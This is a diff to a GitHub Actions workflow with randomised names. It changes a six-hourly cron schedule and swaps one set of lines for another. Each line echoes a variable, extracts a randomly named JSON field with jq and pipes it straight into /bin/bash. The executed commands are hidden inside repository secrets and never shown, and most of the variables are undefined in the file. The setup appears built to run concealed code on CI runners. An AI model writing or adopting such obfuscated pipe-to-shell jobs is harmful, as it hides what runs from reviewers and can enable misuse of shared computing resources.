@@ -1,9 +1,9 @@
 name: laoqiuling8311
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
-
+    - cron: '28 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: laoqiuling8311
         env:
-          mw94661: ${{ secrets.mw94661 }}
+          c8: ${{ secrets.c8 }}
         run: |
-          echo $mw94661 | jq -r .q0 | /bin/bash
-          echo $qedjl06846 | jq -r .g8652 | /bin/bash
-          echo $ted1 | jq -r .gdnw65 | /bin/bash
-          echo $tsb7023 | jq -r .qenzq3370 | /bin/bash
-          echo $hss95513 | jq -r .iml446 | /bin/bash
-          echo $vbui1446 | jq -r .ngao61624 | /bin/bash
-          echo $momf4 | jq -r .oi068 | /bin/bash
-          echo $q1385 | jq -r .kmg328 | /bin/bash
-          echo $zz7 | jq -r .tpstt93871 | /bin/bash
-          echo $taqys49 | jq -r .r79733 | /bin/bash
-          echo $ghrmr8255 | jq -r .l507 | /bin/bash
-          echo $yxgta90 | jq -r .ksg25 | /bin/bash
-          echo $ckwbs3411 | jq -r .zcei7 | /bin/bash
-          echo $ccv450 | jq -r .te8655 | /bin/bash
-          echo $crj20 | jq -r .t7 | /bin/bash
-          echo $hn294 | jq -r .vv7 | /bin/bash
-          echo $q4 | jq -r .vscng192 | /bin/bash
+          echo $c8 | jq -r .roi61 | /bin/bash
+          echo $km4069 | jq -r .xxwav2411 | /bin/bash
+          echo $ybhn9939 | jq -r .zfkap5980 | /bin/bash
+          echo $cgxet92 | jq -r .scxr4 | /bin/bash
+          echo $d8 | jq -r .hywhx382 | /bin/bash
+          echo $mqcm7586 | jq -r .voahj1125 | /bin/bash
+          echo $fp008 | jq -r .vbca707 | /bin/bash
+          echo $zolgu9 | jq -r .n40 | /bin/bash
+          echo $hyr879 | jq -r .h7 | /bin/bash
+          echo $t5 | jq -r .hi06651 | /bin/bash
+          echo $hrm4246 | jq -r .egk2 | /bin/bash
+          echo $qj708 | jq -r .vc00539 | /bin/bash
+          echo $vtu190 | jq -r .ugsu14 | /bin/bash
 
